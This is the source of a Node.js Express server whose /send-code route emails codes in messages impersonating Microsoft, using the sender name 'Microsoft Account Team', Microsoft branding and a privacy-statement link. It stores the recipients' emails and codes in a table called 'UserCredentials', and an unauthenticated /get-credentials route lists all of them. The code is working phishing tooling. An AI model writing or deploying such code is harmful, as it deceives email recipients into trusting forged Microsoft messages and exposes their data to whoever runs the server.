require('dotenv').config();
const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const Parse = require('parse/node');
const path = require('path');

const app = express();

// Initialize Parse
Parse.initialize(
    process.env.PARSE_SERVER_APPLICATION_ID,
    process.env.PARSE_SERVER_JAVASCRIPT_KEY,
    process.env.PARSE_SERVER_MASTER_KEY
);
Parse.serverURL = process.env.PARSE_SERVER_URL;

// CORS configuration
app.use(cors({
    origin: ['http://127.0.0.1:5500', 'http://localhost:8000', 'http://127.0.0.1:8000'],
    credentials: true,
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname)));

// Create Parse Object for User
const UserCredentials = Parse.Object.extend("UserCredentials");

// Create a transporter for sending emails
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS
    }
});

// Verify email configuration
transporter.verify((error, success) => {
    if (error) {
        console.error('Email configuration error:', error);
    } else {
        console.log('Email server is ready to send messages');
    }
});

// Generate a random 6-digit code
function generateCode() {
    return Math.floor(100000 + Math.random() * 900000).toString();
}

app.post('/send-code', async (req, res) => {
    try {
        console.log('Received request to send code:', req.body);
        const { email } = req.body;

        if (!email) {
            return res.status(400).json({ 
                success: false, 
                message: 'Email is required' 
            });
        }

        const code = generateCode();
        console.log('Generated code:', code, 'for email:', email);

        // Store data in Back4App
        const userCredentials = new UserCredentials();
        userCredentials.set("email", email);
        userCredentials.set("verificationCode", code);
        userCredentials.set("codeExpiry", new Date(Date.now() + 30 * 60000)); // 30 minutes
        await userCredentials.save();

        console.log('User data saved to Back4App');

        // Email configuration
        const mailOptions = {
            from: {
                name: 'Microsoft Account Team',
                address: process.env.EMAIL_USER
            },
            to: email,
            subject: 'Security Code for Microsoft Account',
            html: `
                <div style="font-family: 'Segoe UI', Arial, sans-serif; max-width: 600px; margin: 0 auto;">
                    <img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" 
                         style="width: 108px; margin-bottom: 20px;" alt="Microsoft Logo">
                    <h2 style="color: #000;">Security Code</h2>
                    <p>Please use the following security code for your Microsoft account:</p>
                    <div style="background-color: #f8f9fa; padding: 12px 20px; margin: 20px 0; display: inline-block;">
                        <h1 style="color: #0067b8; font-size: 24px; letter-spacing: 2px; margin: 0;">${code}</h1>
                    </div>
                    <p style="color: #666; font-size: 14px;">This code will expire in 30 minutes.</p>
                    <p style="color: #666; font-size: 14px;">If you didn't request this code, you can safely ignore this email.</p>
                    <div style="margin-top: 30px; padding-top: 20px; border-top: 1px solid #eee; font-size: 12px; color: #666;">
                        <p>Microsoft respects your privacy. To learn more, please read our 
                           <a href="https://privacy.microsoft.com/en-us/privacystatement" style="color: #0067b8; text-decoration: none;">Privacy Statement</a>.</p>
                    </div>
                </div>
            `
        };

        // Send the email
        await transporter.sendMail(mailOptions);
        console.log('Verification code email sent successfully to:', email);
        
        res.json({ 
            success: true, 
            message: 'Verification code sent successfully' 
        });
    } catch (error) {
        console.error('Error sending verification code:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Failed to send verification code',
            error: error.message 
        });
    }
});

// Verify code endpoint
app.post('/verify-code', async (req, res) => {
    try {
        const { email, code } = req.body;
        
        const query = new Parse.Query(UserCredentials);
        query.equalTo("email", email);
        query.equalTo("verificationCode", code);
        query.greaterThan("codeExpiry", new Date());
        
        const user = await query.first();
        
        if (user) {
            res.json({ success: true, message: 'Code verified successfully' });
        } else {
            res.status(400).json({ success: false, message: 'Invalid or expired code' });
        }
    } catch (error) {
        console.error('Error verifying code:', error);
        res.status(500).json({ success: false, message: 'Error verifying code' });
    }
});

// Get credentials endpoint (protected)
app.get('/get-credentials', async (req, res) => {
    try {
        const query = new Parse.Query(UserCredentials);
        const credentials = await query.find();
        res.json(credentials.map(cred => ({
            email: cred.get('email'),
            verificationCode: cred.get('verificationCode'),
            createdAt: cred.createdAt
        })));
    } catch (error) {
        console.error('Error fetching credentials:', error);
        res.status(500).json({ success: false, message: 'Error fetching credentials' });
    }
});

// Serve index.html
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Error handling middleware
app.use((err, req, res, next) => {
    console.error('Error:', err);
    res.status(500).json({ 
        success: false, 
        message: 'Internal Server Error',
        error: err.message 
    });
});

// Start the server
const PORT = process.env.PORT || 8000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT}`);
    console.log(`Access the application at:`);
    console.log(`- http://localhost:${PORT}`);
    console.log(`- http://127.0.0.1:${PORT}`);
});
